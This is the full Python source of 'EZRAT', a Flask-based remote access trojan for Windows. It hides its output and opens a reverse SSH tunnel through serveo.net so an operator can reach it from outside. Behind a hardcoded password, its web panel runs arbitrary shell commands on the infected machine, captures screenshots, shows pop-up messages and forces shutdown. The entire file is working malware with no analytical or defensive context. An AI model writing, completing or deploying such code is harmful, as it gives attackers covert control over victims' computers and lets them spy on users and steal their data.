from flask import Flask, request
from subprocess import Popen, PIPE, call
import os, sys
from PIL import Image, ImageGrab
from io import BytesIO
import base64
from threading import Thread

sys.stdout = open(os.devnull, 'w')

passwd="ez1337"

start = '''
<html>
<head>
<title>EZRAT</title>
</head>
<body bgcolor="#24262b">
<font color="#2b5394">
<h1>EZRAT LOGIN</h1>
<form action="/login" method="POST">
    <input name="pass">
    <input type="submit" value="Login">
</form>
</body>
</html>
'''
EZUI = '''
<html>
<title>EZRAT</title>
<body bgcolor="#24262b">
<font color="#2b5394"/>
<h1>EZRAT UI</h1>

<form action="/execute" method="POST">
	<input name="command"/>
	<input type="submit" value="Execute"/>
</form>
<form action="/shutdown" method="POST"/>
	<input type="submit" value="Shutdown"/>
</form>
<form action="/msg" method="POST">
	<input name="msg"/>
	<input type="submit" value="Send Message"/>
</form>
<form action="/screenshot" method="POST">
	<p>Image Downscalefaktor:</p>
	<input type="range" min="1" max="8" value="2" name="scale" id="scale"/>
	<p>Downscale: <span id="discale"></span></p>
	<input type="submit" value="Screenshot"/>
</form>
<form action="/end" method="POST">
	<input type="submit" value="End"/>
</form>
<script>
var slider = document.getElementById("scale");
var output = document.getElementById("discale");
output.innerHTML = slider.value;

slider.oninput = function() {
  output.innerHTML = this.value;
}
</script>

'''
filename = sys.argv[0].split("\\")[-1]
endcmd = "taskkill /IM "+ filename +" /F"
port = filename.split(".")[1]

wd=os.getcwd()+"\\"

def serveo():
	while True:
		call("ssh -R "+port+":127.0.0.1:2626 serveo.net" , shell=True)


Popen('ssh -o "StrictHostKeyChecking no" serveo.net', shell=True)
Thread(target=serveo, daemon=True).start()

app = Flask(__name__)


@app.route("/")
def main():
	return start

@app.route("/login", methods=['POST'])
def login():
	password = request.form["pass"]
	print(password)
	if password == passwd:
		return EZUI
	else:
		return start

@app.route("/execute", methods=['POST'])
def execute():
	command = request.form["command"]
	if command.startswith("cd "):
		data = command[3:]
		print(data)
		global wd
		nwd = wd
		print(nwd)
		if data=="..":
			nwd = nwd[:-len(nwd.split("\\")[-2])-1]
		elif data[1:3] == ":\\":
			nwd = data

		elif data.startswith("."):
			if data[1:].startswith("/") or data[1:].startswith("\\") or data[1:].startswith(" "):
				nwd += data[2:]
		else:
			nwd += data
		if not nwd[-1]=="\\":
			nwd += "\\"
		try:
			Popen("echo hi", shell=True, cwd=nwd)
			wd=nwd
			cmdout = "Successfully change directory! \n"+wd
			return EZUI +"<p>"+cmdout.replace("\n","</p><p>")
		except:
			cmdout = "Error changing directory!!\n Please ensure the path is valid!"
			return EZUI +"<p>"+cmdout.replace("\n","</p><p>")
	else:
		cmdout = Popen(command, stdout=PIPE, stderr=PIPE, shell=True, cwd=wd)
		return EZUI + "<p>Command Feedback: </p><p>"+str((cmdout.stdout.read() + cmdout.stderr.read()).decode('utf-8', "replace").replace("\n","</p><p>"))+"</p>"

@app.route("/end", methods=['POST'])
def end():
	Popen(endcmd, shell=True)
	return "Bye"

@app.route("/shutdown", methods=['POST'])
def shutdown():
	Popen("shutdown /s /t 00", shell=True)
	return EZUI

@app.route("/screenshot", methods=["POST"])
def screenshot():
	img = ImageGrab.grab()
	scale= int(request.form["scale"])
	x,y = img.size
	x/=scale
	y/=scale
	img=img.resize((int(x),int(y)))
	image = BytesIO()
	img.save(image, "png")
	image.seek(0)
	image = image.read()
	finimg = base64.b64encode(image)
	return EZUI + "<img src='data:image/png;base64,"+finimg.decode()+"'/>"


@app.route("/msg", methods=["POST"])
def msg():
	msg = request.form["msg"]
	Popen("msg * "+msg, shell=True)
	return EZUI

app.run(debug=False,host="127.0.0.1", port=2626)

